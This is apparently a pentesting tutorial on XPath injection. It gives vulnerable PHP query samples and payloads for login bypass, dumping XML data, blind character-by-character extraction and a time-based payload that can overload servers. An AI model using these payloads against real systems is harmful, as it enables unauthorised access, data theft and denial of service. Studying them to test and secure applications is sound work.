# XPath Injection

- XML Path Language (XPath) is a query language for Extensible Markup Language (XML) data. Specifically, we can use XPath to construct XPath queries for data stored in the XML format. 

### Authentication Bypass

```shell
# Sample vulnerable code
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);

# Injection payload
# /users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
# /users/user[username/text()='admin' or '1'='1' and password/text()='abc']
' or '1'='1
```

```shell
# Sample vulnerable code
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);

# Injection Payload
# This wont work: /users/user[username/text()='' or '1'='1' and password/text()='59725b2f19656a33b3eed406531fb474']

# We can inject a double or clause in the username to make the XPath query return true
# /users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']
' or true() or '

# We can iterate over all users by their position
# /users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb474']
' or position()=2 or '

#  We can search for specific users if we know part of the username.
# /users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406531fb474']
' or contains(.,'admin') or '
```

## Data Exfiltration

- The payload totally depends on the structure of the query, but we donot know it yet.
- So we try to create a query that is possibly used on the backend and try to exploit it.

```shell
# Checking for xpath injection vulnerability
') or ('1'='1
```

- We can inject a new query to get all text nodes from the xml document using `|`, which is similar to union based sqli.

```shell
#  This returns all text nodes in the XML document. Therefore, the response contains all data stored in the XML document
# Sample vulnerable query: /a/b/c/[contains(d/text(), '') and ('1'='2')]/fullstreetname | //text()
| //text()

# This payload moves back up to the document's root and selects all text nodes, 
# Thus, this query also returns the entire XML document.
# Sample vulnerable query: /a/b/c/[contains(d/text(), '') or ('1'='1')]/../../..//text()
../../..//text()
```

### Node Selection Exploitation

- In case the query at the backend only returns limited number of results, we may not be able to fetch all data at once.
We can exploit Node Selection to fetch data.
- To iterate through the XML schema using the node selection part of the XPath query, we must first determine the schema depth. 
- We can follow these steps to determine the depth:
  - Set all the parameters to `') and ('1'='2` so no data is returned.
  - Inject `| /*[1]` in the last parameter.

> The subquery /*[1] starts at the document root /, moves one node down the node tree due to the wildcard *, and selects the first child due to the predicate [1]. Thus, this subquery selects the document root's first child, the document root element node. Since the document root element node has multiple child nodes, it is of the data type array in PHP, which we can confirm by analyzing the response. The web application expects a string but receives an array and is thus unable to print the results.

  - We can now determine the schema depth by iteratively appending an additional /*[1] to the subquery until the behavior of the web application changes.

> Note that the depth may increase or decrease depending on the node.

```shell
| /*[1]	(Nothing)
| /*[1]/*[1]	(Nothing)
| /*[1]/*[1]/*[1]	(Nothing)
| /*[1]/*[1]/*[1]/*[1]	(Data)
| /*[1]/*[1]/*[1]/*[1]/*[1]	(No Results!)
```

  - Now we can start exfiltrating data by increasing the position in the last predicate until no more data can be retrieved:

```shell
| /*[1]/*[1]/*[1]/*[1]	(value)
| /*[1]/*[1]/*[1]/*[2]	(value)
| /*[1]/*[1]/*[1]/*[3]	(value)
| /*[1]/*[1]/*[1]/*[4]	(No Results!)
```

  - Similarly we can fetch data from any node in the document.


### Predicate Exploitation

- Some web applications may not allow us to manipulate the node selection part of the XPath query.
- Instead, our input is injected into the predicate.
- These settings enable us to iterate over the XML document and exfiltrate data using the `position()` function.
- We can exfiltrate the data using the following method:
  - Inject `') and (position()>0) and ('1'='1`. The query becomes `/a/b/c/[contains(d/text(), '') and (position()>0) and ('1'='1')]/fullstreetname`
  - We can now increase the position threshold to exfiltrate the next data items. `') and (position()>5) and ('1'='1`

> Since we do not control the node selection, iterating through all positions only enables us to exfiltrate all selected nodes. We cannot exfiltrate other nodes.


## Blind Exploitation

- In cases where the web application does not display the query results to us, it is still possible to exfiltrate data with a methodology similar to blind SQL injection.
- There is no sleep function in XPath, so we need an indicator by the web application that tells us whether the query returns any results. 
- We can exfiltrate data using the following methodology:
  - The name() function can be called on any node and gives us the name of that node.
  - The substring() function allows us to exfiltrate the name of a node one character at a time.
  - The string-length() function enables us to determine the length of a node name, allowing us to determine when to stop the exfiltration.
  - The count() function returns the number of children of an element node.

> If the XPath injection point is not inside of a predicate, we can apply the same methodology as discussed below by appending our own predicate.

```shell
# Check for vulnerablility
' or '1'='1

# Exfiltrate the length of root node name.
# Increment the number until you get valid response
# We can use other operators like <,<=,>, and >= to speed up the search.
' or string-length(name(/*[1]))=1 and '1'='1

# Exfiltrate the root node name.
' or substring(name(/*[1]),1,1)='a' and '1'='1 # first char
' or substring(name(/*[1]),2,1)='a' and '1'='1 # second char

# Exfiltrating the Number of Child Nodes
' or count(/users/*)=1 and '1'='1

# Exfiltrating the attribute name of child node
' or string-length(name(/users/*[1]))=1 and '1'='1
' or string-length(name(/users/*[2]))=1 and '1'='1

# Exfiltrating the value of attribute of child node
' or string-length(/users/user[1]/username)=1 and '1'='1
' or substring(/users/user[1]/username,1,1)='a' and '1'='1
```

## Time-based Exploitation

- We can abuse the processing time of the web application to create behavior similar to a sleep function.
- We can force the web application to iterate over the entire XML document exponentially, which takes a measurable amount of processing time.
- This can be achieved by recursively calling the count function with stacked predicates, forcing the web application to iterate over all nodes in the XML document exponentially.

```shell
# If the substring condition is true, only then the count will be evaluated
' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```

>  If the XML document is large, this payload can quickly cause a significant load on the web server, potentially resulting in Denial-of-Service (DoS).
